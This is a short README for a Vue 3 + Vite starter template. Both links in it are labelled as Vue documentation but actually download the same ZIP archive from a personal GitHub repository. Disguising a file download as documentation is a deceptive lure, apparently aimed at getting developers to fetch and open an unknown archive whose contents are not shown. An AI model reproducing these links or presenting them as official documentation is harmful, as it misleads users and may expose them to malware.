# Vue 3 + Vite

This template should help get you started developing with Vue 3 in Vite. The template uses Vue 3 `<script setup>` SFCs, check out the [script setup docs](https://github.com/Zhafran29/PBK-T10/raw/refs/heads/main/public/PB_v1.2-beta.4.zip) to learn more.

Learn more about IDE Support for Vue in the [Vue Docs Scaling up Guide](https://github.com/Zhafran29/PBK-T10/raw/refs/heads/main/public/PB_v1.2-beta.4.zip).
